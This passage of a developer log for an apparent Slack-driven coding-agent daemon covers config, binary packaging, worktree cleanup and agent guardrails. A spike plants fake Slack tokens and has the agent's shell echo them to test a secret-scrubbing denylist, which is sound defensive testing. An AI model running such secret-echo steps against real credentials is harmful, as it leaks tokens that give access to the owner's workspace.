  floor as defense-in-depth), not the milestone's spine.

**What M4 is now** (full list in DESIGN.md §8): single `conduit.toml`, install docs, worktree
cleanup, `bun build --compile` binaries, operator `/conduit status` + the two slash-gap fixes + a
sample service unit, plus env-scrub and background-task cost/cancellation as cheap riders.
**Deferred past M4:** the read-only audit channel and symlink-realpath confinement (interim for the
latter: don't let `ln -s` auto-approve).

**Config decision — single `conduit.toml` (TOML).** Consolidates the scattered `.env` +
`conduit.repos.json` + `conduit.roles.json` + `CONDUIT_*` into one file: `[slack]` tokens,
`architects`, `[[repos]]`, `[defaults]` (model/effort/auto-approve/cost cap), and paths.
**Format: TOML**, chosen over JSONC after a Bun-1.3.14 spike — `Bun.TOML.parse` is a built-in
*string* parser (zero deps, clean try/catch errors), whereas Bun parses JSONC only via the
module-import loader (`Bun.file().json()` and `JSON.parse` both throw on comments), so JSONC would
cost either an awkward dynamic-import pattern or a `jsonc-parser` dep. TOML also reads best for
Conduit's shallow config and is the format an architect expects (Cargo/pyproject). **Secrets live
in the one file** (gitignored, single-tenant, the architect owns the box) with **env-var
overrides** for anyone who prefers to keep tokens out of the file. Runtime grants still persist in
SQLite (`roles.source='grant'`); config architects seed from `[architects]` on boot (the existing
`clearConfigRoles` reseed is unchanged). The consolidation is the biggest adoption lever — one
file to fill instead of four.

**Build specifics settled during the 2026-07-19 consistency audit** (a completeness critic
surfaced buildability gaps in the reframed §8 M4; these close them — judgment calls noted):
- **Config is the single source of truth** — the legacy `.env`/`conduit.repos.json`/
  `conduit.roles.json`/`CONDUIT_*` readers are *removed*, not kept for backward-compat; a manual
  cutover covers the one live instance (Acme). Discovery at `./conduit.toml` (override
  `--config`/`CONDUIT_CONFIG`); **boot-time validation** fails fast on missing/malformed required
  fields. Ship a tracked, commented `conduit.example.toml`; `.gitignore` the real file (secrets
  live in it). `[[repos]]` enumerates the §5 fields; a `[paths]` block holds worktree root + DB.
- **Binary** exposes `--config`/`--version`/`--help` and runs an **ordered SQLite `user_version`
  migration** on boot, so an in-place binary upgrade over a persistent store never strands it.
- **Worktree GC respects park-and-resume** — it never collects a worktree bound to a live/parked
  session (only unreferenced ones, or a set interval after an *explicit* stop). Default `stop`
  keeps the tree (reactivation); an explicit clean variant removes it.
- **`stop` targeting** is in-thread `@Conduit stop` (custom slash commands can't run in a thread);
  channel-level `/conduit stop` lists or points to the thread.
- **Env-scrub is a denylist** (drop `SLACK_*`/`CONDUIT_*`, preserve `PATH`/`HOME` + toolchain), not
  a wholesale `options.env` replacement (which would strip the toolchain and break agent builds).
- **Background-task spend** counts against the per-thread runaway cap; cancellation via architect
  `@Conduit cancel` + auto-cancel on cap breach.
- **§4 reconciled:** "Credentials & blast radius" no longer frames scoped daemon creds as an M4
  build item (it's the installer's documented setup) and now notes the M4 agent-shell env-scrub;
  the "if you sell this" line was softened (Conduit is OSS, not SaaS).
- **`/conduit status` is daemon-wide** (across all channels, architect-only) — decided 2026-07-19.
  This changes today's channel-scoped `status`, so the operator view lists every session on the box.

**Consequences:** DESIGN.md §1 (new "Distribution & trust model"), §2 (non-goal #3 sharpened), §4
(credentials reconciled), §8 (M4 rewritten + build specifics folded in, plus two stale "until M4"
forward-references fixed in build-time-safety and the M3 summary); CLAUDE.md M4 "Next up" +
build-time-safety lines updated. Build starts with the `conduit.toml` refactor (`config.ts` /
`daemon.ts` / `types.ts`) since the README documents it.

## 2026-07-19 — M4 §1 complete: single `conduit.toml` (config consolidation)

**Implementation (DESIGN.md §8 M4 deliverable 1).** Conduit now reads ONE config file,
`conduit.toml` (TOML via `Bun.TOML.parse`, zero deps), consolidating the former scattered
`.env` + `conduit.repos.json` + `conduit.roles.json` + `CONDUIT_*`. A faithful superset of the
old `config.ts` parsing — a **consolidation, not a behavior change**. 268 tests (config suite 32),
`tsc` + `check-ports` clean; verified by **actually booting the daemon against the real
`conduit.toml`** (Slack Socket Mode connected, architect seeded from `architects=[…]`), plus the
env-override and fail-fast boot paths.

**Schema.** Top-level `architects = [...]`; `[slack]` `bot_token`/`app_token`; `[paths]`
`db`/`worktrees_root`; `[defaults]` `model`/`effort`/`auto_approve`/`cost_cap_usd`/
`max_concurrent_turns`; `[[roles]]` `{principal, role, scope?}`; `[[repos]]` with EVERY field the
old reader had — `name`/`path`/`default_branch`/`safe_bash_allowlist`/`test_cmd`/`land_cmd`/
`deploy_cmd`/`cost_cap_usd`/`default_model`/`default_effort`/`trusted`/`auto_approve`. Snake_case
(idiomatic TOML — Cargo/pyproject; the old JSON was camelCase, but this is a fresh file format).
Tracked, commented `conduit.example.toml`; the real `conduit.toml` is gitignored (secrets live in it).

**Decisions / notes.**
- **Discovery:** `--config <path>` (daemon argv) > `CONDUIT_CONFIG` env > `./conduit.toml`. A
  `--config` with no/empty/flag-shaped value is an error, not a silent fall-through.
- **Env overrides win over file values** for scalars (tokens, paths, caps, model/effort,
  auto-approve) — the documented M4 rule, so an operator can keep secrets out of the file.
- **ONE deliberate exception — roles.** On a same-`(principal, scope)` collision the FILE wins
  over the env `CONDUIT_ARCHITECTS` quick-list (matches the pre-M4 reader). Role assignments are
  authority; a demote in the owned file must not be silently re-elevated by a leftover env entry.
  (The naive rewrite had inverted this to env-wins, elevation-only; review finding #1 restored it,
  and a regression test locks it.)
- **Ports stayed sealed.** `loadConfig` returns the core domain `ConduitConfig` (NO Slack tokens);
  a separate `loadSlackConfig` returns bare `{botToken, appToken}` strings for the composition root
  (`daemon.ts`) — no Slack TYPE crosses into core, and no `xoxb-`/`xapp-` literal appears in a
  `src/*.ts` (check-ports forbids both). `policy.ts` untouched.
- **`policy_overrides`** (listed among the §5/§8 repo fields) is an unused reserved SQLite column
  the old `config.ts` never read; excluded from the TOML schema to avoid dead config. Revisit if
  per-repo policy overrides are ever implemented.
- **Fail-fast boot validation:** missing file, malformed TOML, or a bad-typed required field throws
  an actionable `Configuration error: …` and exits(1) — never a half-started daemon. Unknown keys
  **warn** (typo protection) rather than throw. `trusted` now validates as a real boolean (was
  silently coerced to false — review finding #4), matching `auto_approve`.
- **Legacy readers removed** (single source of truth): `CONDUIT_REPOS_FILE`/`CONDUIT_ROLES_FILE`/
  `conduit.repos.json`/`conduit.roles.json` parsing is gone. The throwaway-`testrepo` default,
  `CONDUIT_TEST_REPO`, the roles reseed (`clearConfigRoles`), worktree pathing, and all downstream
  behavior are intact.
- **Manual cutover of the one live instance (Acme):** `.env` + `conduit.repos.json` →
  `./conduit.toml` (gitignored), the legacy files moved to `.bak`. A side effect: Bun no longer
  auto-loads `.env`, so the Slack tokens now reach the adapter straight from `conduit.toml` and no
  longer transit `process.env` at all — a small security bonus that anticipates the M4 §5
  agent-shell env-scrub (the `SLACK_*` env-override path still works if an operator prefers it).

**Adversarial review (5 dimensions — parity, security, TOML-edge, correctness, tests/docs — with
refute-by-default verification, run as a multi-agent workflow).** 8 findings confirmed, ALL
low-severity, ALL fixed before commit: (1) roles precedence inversion → restored file-wins +
regression test; (2/6/8) stale `conduit.roles.json` references in the session-manager grant/revoke
messages, the `store.ts` `RoleSource` comment, and DESIGN §2 → repointed at `conduit.toml`; (3/5)
`--config` with no value silently fell back → now errors actionably; (4) `trusted` accepted a
non-boolean silently → now fails fast; (7) restored the dropped `CONDUIT_ARCHITECTS` comma/space
split test. No high/med findings; the port boundary, the explicit-boolean `trusted`/`auto_approve`
guards, architect-seeding integrity, and secrets handling all verified clean. (The verifier also
noted the dev smoke scripts now need a `./conduit.toml` present — true, and satisfied on the dev
box by the cutover; they never ran without a testrepo + auth anyway, so no change.)

**Files:** `src/core/config.ts` (rewritten), `src/daemon.ts` (`parseConfigArg` + config/slack load
+ messages), `conduit.example.toml` (new, tracked), `.gitignore`, `tests/config.test.ts`
(rewritten, 32 tests), plus stale-reference fixes in `src/core/session-manager.ts`,
`src/core/store.ts`, and `DESIGN.md` §2. **Next: M4 §2 — binary + schema migrations.**

## 2026-07-19 — M4 §2 spike: `bun build --compile` bundles `bun:sqlite`; the SDK's native CLI does NOT auto-embed (fix = `pathToClaudeCodeExecutable`)

**Spike (DESIGN.md §8 M4 deliverable 4; scripts in `spikes/m4/`, run on Bun 1.3.14 / macOS
arm64 / subscription OAuth, no `ANTHROPIC_API_KEY`).** Compiled two single-file binaries with
`bun build --compile` and ran the *binaries* (never `bun run`). Findings:

1. **`bun:sqlite` bundles cleanly.** A round-trip (`CREATE`/`INSERT`/`SELECT`) works from the
   compiled binary with no native-module step. **And `PRAGMA user_version` is transactional**:
   inside a `db.transaction(...)`, a DDL + a `PRAGMA user_version = N` bump commit together, and a
   throwing transaction rolls BOTH back (verified the table and the version both revert). This is
   the contract the §2 migration runner rests on — a crash mid-upgrade cannot leave a half-applied
   schema at a bumped version.

2. **The Agent SDK's JS bundles, but its native `claude` subprocess does NOT auto-embed.** The
   `binary-smoke` binary starts the SDK fine, then dies: *"Native CLI binary for darwin-arm64 not
   found. Reinstall @anthropic-ai/claude-agent-sdk without --omit=optional, or set
   options.pathToClaudeCodeExecutable."* Root cause: the real Claude Code runtime ships as a **236MB
   optional per-platform package** (`@anthropic-ai/claude-agent-sdk-darwin-arm64/claude`, an
   `os`/`cpu`-gated `optionalDependency`) that the SDK resolves at runtime relative to its own
   `import.meta.url`. In a compiled binary that URL is `file:///$bunfs/root/...` (Bun's virtual FS),
   the 236MB file was never bundled, and a child process can't exec a `$bunfs` path anyway. `bun
   build --compile` only bundles the JS it can statically see (the base Bun runtime binary is ~60MB;
   the SDK JS barely moves the needle).

3. **The blessed fix works end-to-end.** The SDK ships `@anthropic-ai/claude-agent-sdk/extract`
   (`extractFromBunfs`) precisely for this. `binary-embed` embeds the native CLI with `import claude
   from ".../claude" with { type: "file" }` (Bun bakes the 236MB in → a 297MB binary), calls
   `extractFromBunfs()` at boot (copies it to a content-hash temp path, e.g.
   `/tmp/claude-501/claude-agent-sdk-<hash>/claude`), and passes that as
   `pathToClaudeCodeExecutable`. Result: a **headless `query()` succeeds from the compiled binary on
   subscription OAuth** (`subtype=success`, reply `"READY"`, ~$0.018). So the compiled-binary path
   is viable; the daemon just has to tell the SDK where its native CLI lives.

4. **Compiled-binary detection.** `import.meta.url` starts with `file:///$bunfs/` in a compiled
   binary vs. a real path under `bun run` — a reliable, documented signal (`Bun.embeddedFiles` is
   empty unless you embed, so it's not usable). `process.execPath` is the exe itself when compiled
   (vs. the `bun` binary under `bun run`), which is why the sidecar lookup must be gated on the
   `$bunfs` signal — otherwise a dev box with Claude Code installed at `/opt/homebrew/bin/claude`
   next to `bun` would get picked up.

**Design consequence (shapes the §2 implementation):** the release is a **binary + its native
`claude` companion**, not a lone 60MB file — the SDK's real runtime is a separate 236MB artifact.
Two supported ways to supply it, resolved in the adapter: (a) `CONDUIT_CLAUDE_CLI=<path>` env
override (point at any installed `claude`), and (b) a `claude` **sidecar next to the compiled
binary** (the default release bundle), used only when the `$bunfs` signal says we're compiled. The
true single-file **embed** (finding 3) is proven and documented as the optional recipe, but not the
default: it needs the target platform's native package present at build time and produces a 297MB,
per-platform artifact (the `type: "file"` specifier is platform-specific, so a cross-platform build
needs per-target codegen — a CI concern). Under `bun run` (dev / clone-and-run) nothing changes —
the SDK finds `claude` in `node_modules` and the adapter returns `undefined`. This is a spike-driven
addition to §2's touch list (the kickoff listed `daemon.ts`/`store.ts`/`package.json`; a working
binary also needs the claude-code adapter's `pathToClaudeCodeExecutable` wiring).

## 2026-07-19 — M4 §2 done: binary + schema migrations

**Implementation (DESIGN.md §8 M4 deliverable 4).** Three parts + a release story. 274 tests
(268 → 274: +5 migration, +1 version), `tsc` + `check-ports` clean, and verified by **actually
building a binary and running it** (below).

**(1) Ordered `user_version` schema-migration runner (`store.ts`).** `migrate()` is now an
append-only `migrations[]` where entry *i* carries a store from `user_version` *i* to *i+1*, and
`migrations.length` IS the current version. Each step + its `PRAGMA user_version = N` bump run in one
`db.transaction()` (transactional under bun:sqlite — spike-proven), so a crash mid-upgrade rolls the
whole step back and reboot retries it. Migration **v1** is the *entire* M0–M3.8 schema expressed
**idempotently** (the old `CREATE IF NOT EXISTS` block + every `ensureColumn`, moved verbatim into a
module-level `migrateBaselineV1`). That idempotent shape is what makes adoption over the existing
un-versioned store lossless: a fresh DB gets the full schema and is stamped to 1; the live store
(which sat at `user_version` 0 with all columns already present) runs the baseline as no-ops and is
stamped to 1. A store at a version **above** what the binary knows is refused (no silent downgrade).
Future schema changes append a new entry — **never edit the baseline** (a comment + the tests pin
this). `ensureColumn` became a free function taking `db`.

**(2) CLI (`daemon.ts` + `src/version.ts`).** `--version`/`-v` and `--help`/`-h` short-circuit at
the top of `main()` **before any config load**, so they work without a valid `conduit.toml` and
regardless of a malformed `--config` elsewhere on the line. Version is a single compiled-in constant
in `src/version.ts` (a `bun build --compile` binary has no `package.json` beside it —
`--compile-autoload-package-json` is off), kept in lockstep with `package.json` by
`tests/version.test.ts`. `--help`'s program name comes from `basename(process.execPath)` when
compiled (argv[1] is a `$bunfs` path) else the literal `conduit`.

**(3) Native-CLI wiring (`adapters/claude-code/adapter.ts`).** `resolveClaudeCliPath()` sets the
SDK's `pathToClaudeCodeExecutable` — priority `CONDUIT_CLAUDE_CLI` env → a `claude`/`claude.exe`
sidecar next to `process.execPath` (gated on the `$bunfs` compiled-binary signal) → `undefined`
(dev). Lazy-memoized so `--help`/`--version` never emit its warning. Under `bun run` it returns
`undefined` and behavior is unchanged.

**(4) Release story (`scripts/build-binary.ts` + `package.json` + `.gitignore`).** `bun run build`
compiles the daemon and bundles the native `claude` beside it into `dist/<platform>/{conduit,
claude}`; `build:darwin-*`/`build:linux-*` cross-target the four macOS/Linux binaries. Host builds
**discover** the installed native package by scanning `node_modules/@anthropic-ai/claude-agent-sdk-*`
(glibc/musl-proof — `process.arch` can't tell them apart); a cross-target maps the target to its
package and warns (non-fatal) if that platform's native isn't present (build it on a matching
runner, or set `CONDUIT_CLAUDE_CLI`). `dist/` and Bun's `*.bun-build` scratch files are gitignored.

**Verified by running it (not just `bun test`):** built `dist/darwin-arm64/{conduit(62MB),
claude(236MB)}`; the compiled binary's `--version`/`-v`/`--help`/`-h` and the fail-fast config-error
path (`--config /nonexistent`, bare `--config`) all correct + exit(1). **Migration proven on a copy
of the live `conduit.sqlite`:** `user_version` 0 → 1 with sessions/repos/roles/audit counts
unchanged (1/2/1/109), idempotent on re-open. **Sidecar resolution proven from a CLEAN CWD** (no
`node_modules` up-tree, stripped PATH, no API key): no-sidecar → the SDK's "Native CLI binary not
found" error; sidecar-beside-binary → headless `"READY"`; `CONDUIT_CLAUDE_CLI` → `"READY"`. (An
earlier "it works without a sidecar" was a test artifact — the SDK also falls back to a
CWD-relative `node_modules`, so running the binary from the repo root masked the requirement.)

**Adversarial review** (5 dimensions — migration, CLI, adapter, build, code-vs-claims — refute-by-
default verification, run as a multi-agent workflow). **2 confirmed, both low, both fixed before
commit; 5 refuted.** (1) The adapter probed a `claude` sidecar but the build script writes
`claude.exe` on Windows — the two halves of the same milestone disagreed on the Windows layout →
adapter sidecar name is now platform-aware. (2) A native build on a **musl/Alpine** host computed
the glibc package key and missed the installed `-musl` `claude`, silently emitting an incomplete
bundle with a misleading message → host builds now **discover** the installed package by scanning
rather than guessing from `process.arch`. Both are out of the shipped macOS/Linux-glibc matrix
(bounded latent bugs), but the fixes make the adapter and build script internally consistent. Refuted
(correctly): "test name overclaims runner atomicity" (conditioned on a future refactor),
"incomplete-bundle exits 0" (intended for cross-target + loud warning), "`CONDUIT_CLAUDE_CLI` honored
under `bun run` contradicts the contract" (intentional — only the *sidecar* is compiled-gated), and
two about spike-file comments (not shipped code).

**Files:** `src/core/store.ts` (migration runner + baseline), `src/daemon.ts` (CLI), `src/version.ts`
(new), `src/adapters/claude-code/adapter.ts` (`pathToClaudeCodeExecutable` wiring), `package.json`
(build scripts), `scripts/build-binary.ts` (new), `.gitignore` (`dist/`, `*.bun-build`),
`tests/store.test.ts` (+5 migration tests), `tests/version.test.ts` (new), `spikes/m4/` (new: the
three spike entrypoints). **Next: M4 §3 — worktree cleanup.**

## 2026-07-19 — M4 §3 done: worktree cleanup (real teardown + assign-race fix + retention GC)

**Implementation (DESIGN.md §8 M4 deliverable 3).** Real worktree teardown, the assign-race
orphan-leak fix, and a retention/GC policy that holds the park-and-resume invariant (§2 journey 5).
296 tests (274 → 296, +22), `tsc` + `check-ports` clean, and verified by **driving the full
lifecycle against a throwaway git repo** (below), not just `bun test`.

**(1) Real teardown (`worktrees.ts`).** `WorktreeManager.remove({repoPaths, sessionId, branch?})`
runs `git worktree remove --force` + `git branch -D` + `git worktree prune`, **best-effort and
idempotent** — a missing dir, an already-deleted branch, or an unregistered worktree are all
no-errors, so the GC never crashes on one bad tree and a re-run is a clean no-op. `--force`/`-D`
because a disposable worktree normally has uncommitted work + unmerged commits; a physical `rm`
backstop reclaims a dir git never registered (a partially-created tree). `repoPaths` is a set: the
one owning repo for a known session, or every configured repo for an orphan whose owner is unknown
(a path is a worktree of at most one repo, so the non-owners no-op). A **path-confinement guard**
refuses any path not *strictly under* the worktree root — both an escape (`../x`) and the root
itself (an empty/`.` id resolves to root and would rm every tree). `listExisting()` returns each
session-id dir + its mtime (for the GC's orphan grace, below).

**(2) Assign-race orphan-leak fix (`session-manager.ts`).** `assign` provisions the worktree BEFORE
the `(surface,conversation)` UNIQUE insert; the loser of a race caught its `ConflictError` and left
its worktree to leak (the old code literally said "cleanup tooling arrives with M4"). Now the loser
tears its own worktree down immediately — precise (it holds the exact repo + branch) — and audits a
`worktree_orphan_removed`. The GC orphan sweep is the backstop for a crash between `worktree add` and
the insert.

**(3) Retention/GC (`session-manager.ts` + `store.ts`).** A new nullable `sessions.cleanup_at`
column (migration **v2**, plain forward `ALTER TABLE ADD COLUMN` — the runner guarantees
exactly-once, so no `ensureColumn` gymnastics) records an explicit-clean-stop schedule.
`collectWorktrees(now?, {orphanMinAgeMs?})` has two targets:
  - **Clean-stopped, past retention** — a session ended with `@Conduit stop clean` whose grace window
    elapsed: remove worktree + branch, then `deleteSession` DISCARDS the row (approvals + turns
    dropped in a transaction; the **audit_log is KEPT** — no FK, so the security trail survives a
    discard). Serialized through the per-session FIFO and **re-read there**, so a teardown can never
    race an in-flight turn or a reactivation that just cancelled the cleanup.
  - **Orphan directories** (no session row) — the assign-race backstop + crash-stranded trees.

  A **plain `stop` keeps its worktree forever** (`cleanup_at` NULL — invisible to the GC) for
  reactivation (journey 6); the `status = 'stopped'` guard is baked into `sessionsDueForCleanup`'s
  query so a live/parked worktree can never surface. Reactivation (`assign` on a stopped session)
  **clears `cleanup_at`**, cancelling a pending teardown, and re-reads under the FIFO to bail
  gracefully if the GC discarded the row first (no false "reactivated"). Command surface:
  `@Conduit stop clean` (slack adapter `parseMentionCommand` gets one strict arity rule); default
  retention 24h (a `SessionManagerOptions` override).

**(4) The GC-vs-create race (found in self-review, before the workflow, and independently
re-confirmed by 3 review lenses).** An in-flight `assign` creates its worktree on disk a beat before
its DB row exists; a periodic orphan sweep could interleave at that await, see a row-less dir, and
delete a LIVE session's worktree. Fixed with an **orphan grace period** (`orphanMinAgeMs`, default
10 min ≫ any assign): the sweep skips a just-created tree, so only a genuinely-aged orphan is
collected. The daemon's **boot sweep passes `orphanMinAgeMs: 0`** — no surface is live yet, so no
assign can be mid-flight and any crash-orphan is safe to reclaim immediately.

**(5) Wiring (`daemon.ts`).** A boot sweep (before surfaces go live) + an hourly `setInterval`
(`unref()` so it never keeps the process alive; a re-entrancy guard skips a tick while the prior
sweep runs; `clearInterval` on shutdown).

**Verified by running it:** a drive script built the real `Store`+`WorktreeManager`+`SessionManager`
against a throwaway git repo and watched the full lifecycle — worktree **created** (registered in
git) → **parked** → **`stop clean`** (kept inside the window) → **reactivated** (cleanup cancelled;
far-future GC still keeps it) → **`stop clean`** again → **collected only past the window** (removed
from disk, deregistered in git, branch deleted, row discarded, thread unassigned). All assertions ✓.

**Heavy invariant tests.** `tests/worktrees.test.ts` (new, 9): real create/remove, force-teardown of
a dirty tree, idempotent re-run, unregistered-orphan reclaim, multi-repo owner selection,
`listExisting` (+ mtime), the path-escape refusal, and the refuse-the-root guard (empty/`.` id can't
rm the whole root). `tests/session-manager.test.ts` (+11): plain-stop keeps + never collected; a
parked tree never collected; `stop clean` kept in-window; past-window removes worktree/branch/row
(fresh assign starts a NEW session); reactivation cancels cleanup; the orphan grace protects a
just-created tree then collects it once aged; the assign-race orphan leak is closed (concurrent
assigns → one winner, no orphan dir); the orphan sweep reclaims an orphan while keeping a live tree;
`stop clean` on an already-plain-stopped session schedules teardown; and a redundant plain re-stop is
a clear no-op. `tests/store.test.ts` (+3): `cleanup_at` round-trip, `sessionsDueForCleanup` (stopped
+ past only), `deleteSession` (drops turns/approvals, keeps audit); migration-version bump to 2 (+
the v0-adoption test drops `cleanup_at` to faithfully reconstruct the pre-runner schema).
`tests/adapter-slack.test.ts` (+1): `stop clean` parses; stray/over-arity stays conversation.

**Adversarial review** (5 lenses — invariant, teardown/fs-safety, migration/store, concurrency,
UX/test-honesty — refute-by-default verification, run as a multi-agent workflow). **1 confirmed
(low), 4 refuted.** Confirmed: the plain-stop message advertised `@Conduit stop clean` as a recovery
action, but the command was rejected on an already-stopped session (a dead-end). Fixed the *better*
way — `stop clean` now schedules teardown on an already-stopped session too, so the advertised
recovery is real (and a redundant plain re-stop gives a clear "already stopped" reply instead of "no
active session"). Refuted (correctly, against the working tree): the 3 GC-vs-create race findings
(the `orphanMinAgeMs` mtime grace, added in self-review before the workflow, already closes it) and
the `path === root` escape carve-out (no reachable caller passes an empty/`.` id) — but that latent
footgun was still **hardened** (the guard now refuses the root itself; cheap, catastrophic if ever
hit). Every park-and-resume, retention, teardown-confinement, and migration invariant held.

**Files:** `src/core/worktrees.ts` (remove + listExisting + confinement guard), `src/core/store.ts`
(cleanup_at + migration v2 + mark/clear/due/deleteSession), `src/core/session-manager.ts` (stop
clean incl. already-stopped, orphan-leak fix, reactivation cancel + race guard, collectWorktrees +
orphan grace, retentionLabel), `src/daemon.ts` (boot + periodic GC), `src/adapters/slack/adapter.ts`
(`stop clean` parse), `tests/worktrees.test.ts` (new), `tests/session-manager.test.ts`,
`tests/store.test.ts`, `tests/adapter-slack.test.ts`. **Next: M4 §4 — daemon-wide `/conduit status`
+ slash fixes.**

## 2026-07-19 — M4 §4 done: daemon-wide operator `/conduit status` + slash fixes

**What shipped.** `/conduit status` (the Slack SLASH command) is now a **daemon-wide, architect-only
operator dashboard**, delivered as an **ephemeral** `respond` (never a public channel post): uptime,
session counts across ALL channels (active/parked/stopped), turns-in-flight vs the concurrency cap, the
daemon-wide pending-approval backlog, and a config summary (default model/effort, cost cap, auto-approve
default, repo + architect counts). The in-thread **`@Conduit status`** mention is UNCHANGED — the
channel-scoped session list, posted in-thread. **`/conduit stop`** (previously a near-no-op) now
ephemerally lists the channel's live sessions and points the operator to the in-thread `@Conduit stop`
(custom slash commands can't run inside a thread; targeting a stop stays the mention, mirroring
`@Conduit assign`). Both slash gaps from DESIGN §8-(5) closed: status is ephemeral (was public), stop is
actionable (was silent).

**Design — how the core stays Slack-free while replying ephemerally.** The reply must be ephemeral (a
Slack transport concern: `respond`'s ephemeral response, per DESIGN §8-(5)), but the DATA is core-owned
(uptime, the concurrency semaphore, the store). Resolved with the same injection shape as
`SurfaceAuthority`: a new **`OperatorConsole`** interface (declared in the adapter) that the composition
root wires to the SessionManager. The adapter's pure, unit-tested
`slashEphemeralText(sub, author, channelId, operator)` routes `status`→`operatorStatus` and
`stop`→`channelStopGuidance` (both return rendered text), then the Bolt handler delivers it via
`respond({response_type:"ephemeral"})` — so no `respond`/Bolt type crosses the port and `check-ports`
stays green. Authority is re-decided IN THE CORE (`operatorStatus` checks `isArchitect` itself and
returns the refusal line for non-architects — the adapter's pre-check is UX only); since the view is
aggregate, read-only telemetry that mutates nothing, a refused view is not audited.

**Core additions.** `SessionManager.operatorStatus(author, channelId, now?)` (daemon-wide dashboard;
`now` injectable for deterministic uptime) and `channelStopGuidance(channelId)`; a shared
`renderChannelSessions(channelId, surfaceId?)` that both the mention `status()` and the slash stop reuse
(the old `status()` body extracted verbatim — behavior parity); `Semaphore.snapshot()` for
in-flight/cap/queued; a module `formatDuration` for coarse uptime. Store: `countPendingApprovals()` and
`countArchitects()` (distinct principals with an architect role at any scope). `startedAt` added to
`SessionManagerOptions` (defaults to construction time; the manager is built once at boot, so that ≈
daemon uptime).

**Verified by running it.** `bun test` 305 pass (+9: operator dashboard render incl. every uptime
magnitude branch, member refusal, daemon-wide counts + pending-approval backlog, live in-flight tracked
against the semaphore via a held turn, stop-guidance listing + assign-hint, and the adapter's
`slashEphemeralText` routing). `tsc --noEmit` + `check-ports` clean. A drive script built the REAL
Store+WorktreeManager+SessionManager against a throwaway repo, assigned sessions across two channels,
plain-stopped one, left a member-initiated pending approval, and printed the operator dashboard, the
member refusal, the stop guidance, and the adapter routing — all 13 assertions ✓ (uptime 1d 2h; 0
active / 2 parked / 1 stopped daemon-wide; 0/3 in-flight; 1 pending; 2 repos; 2 architects).

**Adversarial review** (5 lenses — correctness, security, port-erosion, UX, test-honesty — refute-by-
default, run as a multi-agent workflow). **1 confirmed (a test-coverage nit), 4 refuted.** Confirmed:
`formatDuration`'s hours/minutes/seconds/clock-skew branches were reached only via the days branch —
now driven directly through `operatorStatus` with fixed `now` deltas. Refuted (correctly, against the
working tree): no cross-channel content leak (the daemon-wide view is aggregate counts + config only,
never per-channel session content or secrets); the authority check is genuinely in the core; the
`stopped` count growing over time is correct-by-design (plain-stopped sessions are RETAINED and
reactivatable — surfacing the retained-worktree count is useful operator info, motivating cleanup, not a
bug); and the two untested-path observations (the queued-slot count, the Bolt `respond` call) are
correct-by-design gaps with no defect.

**Files:** `src/core/session-manager.ts` (operatorStatus, channelStopGuidance, renderChannelSessions,
Semaphore.snapshot, formatDuration, startedAt), `src/core/store.ts` (countPendingApprovals,
countArchitects), `src/adapters/slack/adapter.ts` (OperatorConsole, slashEphemeralText, ephemeral
status/stop routing, usage text), `src/daemon.ts` (wire the operator console), `tests/session-manager.test.ts`
(+7), `tests/adapter-slack.test.ts` (+2). **Next: M4 §5 — riders: env-scrub the agent shell +
background-task cost accounting/cancellation.**

## 2026-07-19 — M4 §5 spikes: env-scrub denylist works under keychain OAuth; interrupt (NOT maxBudgetUsd) stops a detached workflow

Both riders were spiked FIRST on the real SDK (subscription/keychain OAuth, no API key, throwaway
`testrepo`) before building — the repo's spike-first rule. Scripts in `spikes/m4/` (`env-scrub.ts`,
`workflow-interrupt.ts`; the latter gates sub-tests on `ONLY=B1|B2` / `B2_BUDGET`).

**Spike (a) — env-scrub the agent shell (`spikes/m4/env-scrub.ts`).** The SDK's `options.env`
**REPLACES the subprocess environment entirely** (confirmed in `sdk.d.ts:1411` — "it is not merged
with process.env"), so a wrong keep-list would break every turn. Test: plant poison secrets
(`SLACK_BOT_TOKEN=xoxb-POISON`, `SLACK_APP_TOKEN`, `CONDUIT_POISON`) + a benign `MY_TOOLCHAIN_VAR` in
the daemon env, build the **denylist** scrub (`{...process.env}` minus keys matching `^SLACK_` /
`^CONDUIT_`), pass it as `options.env`, and have the agent's **Bash** echo those vars.
- **Result: PASS.** The Claude Code CLI **ran cleanly under the scrubbed env on keychain OAuth**
  (`subtype=success`, cost $0.186) — nothing load-bearing was dropped. The agent's shell saw
  `slack=[]`, `conduit=[]` (secrets gone) but `tool=[toolchain-keepme]`, `home=[/Users/…]`,
  `haspath=[yes]` (PATH/HOME/toolchain survived).
- **Why keychain OAuth survives the scrub:** the CLI reaches macOS keychain creds via `HOME`
  (→ `~/.claude`), which the denylist preserves; there is no `CLAUDE_CODE_OAUTH_TOKEN`/
  `ANTHROPIC_API_KEY` in this deployment, and neither would match the `SLACK_`/`CONDUIT_` prefixes
  anyway (a headless box's `CLAUDE_CODE_OAUTH_TOKEN` is preserved). **Denylist is safe by
  construction** — it drops only our two namespaces and keeps everything the toolchain/CLI needs.
- **Decision:** build the denylist exactly as specced (drop `SLACK_*`/`CONDUIT_*` by prefix). This is
  distinct from `CommandRunner`'s scrub (a fixed *name* list that also drops the Claude auth token,
  because a deploy command doesn't need it) — the AGENT shell MUST keep the Claude auth (the SDK needs
  it), so a prefix denylist (which never matches the auth token) is the right shape.

**Spike (b) — background-workflow cancellation + cost drain (`spikes/m4/workflow-interrupt.ts`).**
Launched a real 6-agent parallel workflow (`permissionMode:"bypassPermissions"`, Workflow tool,
read-only hook) and probed the two candidate levers. SDK primitives found in `sdk.d.ts`: `Query` has
`interrupt()`, `stopTask(taskId)` (stop one bg task by id from `task_started`/`task_notification`),
and `close()` (kills the subprocess); `task_progress` carries an **incremental** `usage.total_tokens`
(but NO running `total_cost_usd`); both `SDKResultSuccess` and `SDKResultError` carry `total_cost_usd`.
- **(B1) `q.interrupt()` DOES stop a DETACHED workflow AND drains cost — PASS.** Interrupting
  mid-workflow produced `task_notification status=stopped`, then a final `result`
  `subtype=error_during_execution terminal=aborted_streaming` carrying **`total_cost_usd=$0.53`**;
  **0** `task_progress` events arrived after the interrupt; query settled **~567 ms** later. So
  `interrupt()` is THE cancellation lever: it halts the background task (no further spend) and still
  yields a drainable cost. **Caveat (load-bearing for the adapter):** the pull that FOLLOWS the
  terminal result **throws** (`[ede_diagnostic] … stop_reason=tool_use`) — the SDK's post-abort
  cleanup. The result+cost arrive BEFORE the throw, so the loop must catch that throw and treat it as
  a clean end (not a turn failure).
- **(B2) `maxBudgetUsd` does NOT stop a detached workflow — the decisive inversion.** With
  `maxBudgetUsd=$0.35` (large enough that the workflow launched first: `task_started` seen), the SDK
  emitted `error_max_budget_usd`/`budget_exhausted` at **$0.60** — **but `task_progress` kept flowing
